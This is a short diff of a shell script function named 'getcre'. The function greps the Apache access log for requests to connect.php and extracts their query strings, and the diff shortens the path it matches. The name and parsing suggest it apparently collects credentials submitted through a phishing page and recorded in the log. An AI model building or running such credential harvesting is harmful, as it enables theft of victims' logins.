@@ -1,7 +1,7 @@
 function getcre(){
 mon="$(sudo tail -1 /var/log/apache2/access.log)"
 
-s="$(grep "GET /windows/connect.php?" /var/log/apache2/access.log | tail -1)"
+s="$(grep "GET /connect.php?" /var/log/apache2/access.log | tail -1)"
 f="$(echo $s | cut -d " " -f 7)"
 
         QUERY="$(echo $f | cut -d "?" -f2)"
